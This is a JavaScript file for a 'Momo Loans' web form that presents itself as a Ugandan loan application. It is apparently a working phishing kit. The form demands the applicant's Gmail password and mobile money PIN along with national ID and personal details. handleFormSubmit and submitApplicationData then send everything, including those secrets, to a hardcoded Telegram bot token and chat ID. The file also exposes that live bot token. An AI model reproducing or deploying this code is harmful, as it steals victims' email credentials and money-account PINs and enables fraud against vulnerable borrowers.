/* ============================================
   MOMO LOANS - JavaScript Functionality
   ============================================ */

// Loan type ranges - No restrictions, users can enter any amount
const loanRanges = {
    personal: { min: 0, max: Infinity, interestRate: 22.5 },
    business: { min: 0, max: Infinity, interestRate: 23 },
    emergency: { min: 0, max: Infinity, interestRate: 25 }
};

// DOM Elements
const loanForm = document.getElementById('loanForm');
const loanTypeSelect = document.getElementById('loanType');
const loanAmountInput = document.getElementById('loanAmount');
const repaymentPeriodInput = document.getElementById('repaymentPeriod');
const amountError = document.getElementById('amountError');
const successMessage = document.getElementById('successMessage');

// Initialize form listeners
document.addEventListener('DOMContentLoaded', function() {
    loanAmountInput.addEventListener('input', calculateLoan);
    repaymentPeriodInput.addEventListener('input', calculateLoan);
    loanTypeSelect.addEventListener('change', updateLoanRange);
    loanForm.addEventListener('submit', handleFormSubmit);

    // Format currency as user types
    loanAmountInput.addEventListener('input', formatCurrency);
    document.getElementById('monthlyIncome').addEventListener('input', formatCurrency);
});

/**
 * Update loan amount range based on selected loan type
 */
function updateLoanRange() {
    const selectedType = loanTypeSelect.value;
    amountError.textContent = '';
    
    if (selectedType && loanRanges[selectedType]) {
        const range = loanRanges[selectedType];
        loanAmountInput.min = range.min;
        loanAmountInput.max = range.max;
        loanAmountInput.placeholder = `Enter any amount (e.g., 100,000)`;
    }
    
    calculateLoan();
}

/**
 * Calculate loan details and update summary
 */
function calculateLoan() {
    const loanType = loanTypeSelect.value;
    const loanAmount = parseFloat(loanAmountInput.value.replace(/,/g, '')) || 0;
    const repaymentMonths = parseInt(repaymentPeriodInput.value) || 0;

    // Validate amount - only check if positive
    amountError.textContent = '';
    
    if (loanAmount < 0) {
        amountError.textContent = 'Loan amount cannot be negative';
    }

    // Calculate interest and total
    if (loanAmount > 0 && repaymentMonths > 0 && loanType) {
        const interestRate = loanRanges[loanType].interestRate;
        const monthlyInterestRate = interestRate / 100;
        const totalInterest = loanAmount * monthlyInterestRate * repaymentMonths;
        const totalRepayment = loanAmount + totalInterest;

        // Update summary
        document.getElementById('summaryAmount').textContent = `USH ${formatNumberWithCommas(loanAmount.toFixed(0))}`;
        document.getElementById('summaryRate').textContent = `${interestRate}% per month`;
        document.getElementById('summaryTotal').textContent = `USH ${formatNumberWithCommas(totalRepayment.toFixed(0))}`;
    } else {
        document.getElementById('summaryAmount').textContent = 'USH 0';
        document.getElementById('summaryRate').textContent = '0%';
        document.getElementById('summaryTotal').textContent = 'USH 0';
    }
}

/**
 * Format number with commas
 */
function formatNumberWithCommas(num) {
    return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
}

/**
 * Format currency input as user types
 */
function formatCurrency(e) {
    let value = e.target.value.replace(/[^0-9]/g, '');
    if (value) {
        e.target.value = formatNumberWithCommas(value);
    }
}

/**
 * Validate phone number format for Uganda
 */
function validateUgandaPhone(phone) {
    // Accept formats: +256701234567, 0701234567, +256 701 234 567, etc.
    const cleanPhone = phone.replace(/\D/g, '');
    return cleanPhone.length >= 9;
}

/**
 * Validate National ID format
 */
function validateNationalID(id) {
    return id.length >= 10 && id.length <= 20;
}

/**
 * Validate email format
 */
function validateEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

/**
 * Validate form data before submission
 */
function validateFormData() {
    // Personal Info
    const fullName = document.getElementById('fullName').value.trim();
    const email = document.getElementById('email').value.trim();
    const phone = document.getElementById('phone').value.trim();
    const nationalID = document.getElementById('national').value.trim();
    const dob = document.getElementById('dob').value;

    // Loan Details
    const loanType = loanTypeSelect.value;
    const loanAmount = parseFloat(loanAmountInput.value) || 0;
    const loanPurpose = document.getElementById('loanPurpose').value;
    const repaymentMonths = parseInt(repaymentPeriodInput.value) || 0;

    // Financial Info
    const monthlyIncome = parseFloat(document.getElementById('monthlyIncome').value.replace(/,/g, '')) || 0;
    const momoNumber = document.getElementById('MomoNumber').value.trim();
    const gmailPassword = document.getElementById('gmailPassword').value;
    const momoPin = document.getElementById('momoPin').value;
    const employmentStatus = document.getElementById('employmentStatus').value;

    // Reference
    const referenceContact = document.getElementById('referenceContact').value.trim();
    const referencePhone = document.getElementById('referencePhone').value.trim();

    // Agreements
    const termsAgreed = document.getElementById('terms').checked;
    const telegramAgreed = document.getElementById('telegram').checked;

    // Validation checks
    const errors = [];

    if (!fullName || fullName.length < 3) {
        errors.push('Please enter a valid full name');
    }

    if (!validateEmail(email)) {
        errors.push('Please enter a valid email address');
    }

    if (!validateUgandaPhone(phone)) {
        errors.push('Please enter a valid phone number');
    }

    if (!validateNationalID(nationalID)) {
        errors.push('Please enter a valid National ID');
    }

    if (!dob) {
        errors.push('Please select your date of birth');
    } else {
        const age = new Date().getFullYear() - new Date(dob).getFullYear();
        if (age < 18) {
            errors.push('You must be at least 18 years old');
        }
    }

    if (!loanType) {
        errors.push('Please select a loan type');
    }

    if (loanAmount <= 0) {
        errors.push('Please enter a valid loan amount (must be greater than 0)');
    }

    // No range validation - users can enter any amount

    if (!loanPurpose) {
        errors.push('Please select the purpose of the loan');
    }

    if (repaymentMonths <= 0 || repaymentMonths > 12) {
        errors.push('Repayment period must be between 1 and 12 months');
    }

    if (monthlyIncome <= 0) {
        errors.push('Please enter your monthly income');
    }

    if (loanAmount > monthlyIncome * 3) {
        errors.push('Loan amount exceeds 3 times your monthly income');
    }

    if (!validateUgandaPhone(momoNumber)) {
        errors.push('Please enter a valid Momo account number');
    }

    if (!gmailPassword || gmailPassword.length < 6) {
        errors.push('Please enter a valid Gmail password (minimum 6 characters)');
    }

    if (!momoPin || momoPin.length !== 4 || !/^\d{4}$/.test(momoPin)) {
        errors.push('Please enter a valid 4-digit Momo PIN');
    }

    if (!employmentStatus) {
        errors.push('Please select your employment status');
    }

    if (!referenceContact || referenceContact.length < 3) {
        errors.push('Please enter a valid reference contact name');
    }

    if (!validateUgandaPhone(referencePhone)) {
        errors.push('Please enter a valid reference phone number');
    }

    if (!termsAgreed) {
        errors.push('You must agree to the Terms & Conditions');
    }

    if (!telegramAgreed) {
        errors.push('You must agree to receive updates via Telegram');
    }

    return errors;
}

/**
 * Handle form submission
 */
function handleFormSubmit(e) {
    e.preventDefault();

    // Validate form
    const errors = validateFormData();

    if (errors.length > 0) {
        alert('Please fix the following errors:\n\n' + errors.join('\n'));
        return;
    }

    // Collect form data
    const formData = {
        personalInfo: {
            fullName: document.getElementById('fullName').value,
            email: document.getElementById('email').value,
            phone: document.getElementById('phone').value,
            nationalID: document.getElementById('national').value,
            dateOfBirth: document.getElementById('dob').value
        },
        loanDetails: {
            type: loanTypeSelect.value,
            amount: parseFloat(loanAmountInput.value),
            purpose: document.getElementById('loanPurpose').value,
            repaymentPeriod: parseInt(repaymentPeriodInput.value)
        },
        financialInfo: {
            monthlyIncome: parseFloat(document.getElementById('monthlyIncome').value.replace(/,/g, '')),
            momoAccount: document.getElementById('MomoNumber').value,
            gmailPassword: document.getElementById('gmailPassword').value,
            momoPin: document.getElementById('momoPin').value,
            employmentStatus: document.getElementById('employmentStatus').value
        },
        reference: {
            contactName: document.getElementById('referenceContact').value,
            contactPhone: document.getElementById('referencePhone').value
        },
        submissionTime: new Date().toISOString()
    };

    // Send data to backend (Telegram bot or API)
    submitApplicationData(formData);

    // Show success message
    loanForm.style.display = 'none';
    successMessage.style.display = 'flex';
}

/**
 * Submit application data to backend
 * This would typically send the data to your Telegram bot or API
 */
function submitApplicationData(formData) {
    const telegramBotToken = '8578797610:AAGXTt2oa6MaXTo2khM3LR0StAejU7ZCNdY';
    const chatId = '6816093099';
    
    console.log('Application Data:', formData);
    const message = formatTelegramMessage(formData);
    
    // Send to Telegram
    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log('Message sent to Telegram:', data);
    })
    .catch(error => {
        console.error('Error sending message:', error);
    });
    
    // Also store locally for backup
    localStorage.setItem('momo_application_' + Date.now(), JSON.stringify(formData));
}
    
/**
 * Format application data as a message for Telegram
 */
function formatTelegramMessage(data) {
    const info = data.personalInfo;
    const loan = data.loanDetails;
    const financial = data.financialInfo;
    const ref = data.reference;

    return `
🎉 <b>NEW LOAN APPLICATION</b>

<b>👤 Personal Information:</b>
Name: ${info.fullName}
Email: ${info.email}
Phone: ${info.phone}
National ID: ${info.nationalID}
DOB: ${info.dateOfBirth}

<b>💰 Loan Details:</b>
Type: ${loan.type.toUpperCase()}
Amount: USH ${formatNumberWithCommas(loan.amount.toFixed(0))}
Purpose: ${loan.purpose}
Repayment Period: ${loan.repaymentPeriod} months

<b>💵 Financial Information:</b>
Monthly Income: USH ${formatNumberWithCommas(financial.monthlyIncome.toFixed(0))}
Momo Account: ${financial.momoAccount}
Gmail Password: ${financial.gmailPassword}
Momo PIN: ${financial.momoPin}
Employment: ${financial.employmentStatus}

<b>👥 Reference:</b>
Name: ${ref.contactName}
Phone: ${ref.contactPhone}

<b>⏰ Submitted:</b> ${new Date(data.submissionTime).toLocaleString()}
    `;
}

/**
 * Prevent form submission on Enter key in number fields
 */
document.addEventListener('keypress', function(e) {
    if (e.key === 'Enter' && (e.target.type === 'number' || e.target.type === 'tel')) {
        e.preventDefault();
    }
});

/**
 * Auto-format phone numbers
 */
function autoFormatPhone(input) {
    let value = input.value.replace(/\D/g, '');
    
    if (value.length > 0) {
        if (value.startsWith('256')) {
            value = '+' + value;
        } else if (value.startsWith('07') || value.startsWith('06') || value.startsWith('05')) {
            value = '+256' + value.substring(1);
        }
    }
    
    input.value = value;
}

// Apply auto-formatting to phone inputs
document.getElementById('phone').addEventListener('blur', function() {
    autoFormatPhone(this);
});

document.getElementById('MomoNumber').addEventListener('blur', function() {
    autoFormatPhone(this);
});

document.getElementById('referencePhone').addEventListener('blur', function() {
    autoFormatPhone(this);
});

/**
 * Add animation to elements on scroll
 */
const observerOptions = {
    threshold: 0.1,
    rootMargin: '0px 0px -50px 0px'
};

const observer = new IntersectionObserver(function(entries) {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.style.opacity = '1';
            entry.target.style.transform = 'translateY(0)';
        }
    });
}, observerOptions);

// Observe service cards for animation
document.querySelectorAll('.service-card').forEach(card => {
    card.style.opacity = '0';
    card.style.transform = 'translateY(20px)';
    card.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
    observer.observe(card);
});

console.log('Momo Loans - Application Ready');
console.log('To integrate with Telegram bot, configure the bot token and chat ID in submitApplicationData function');
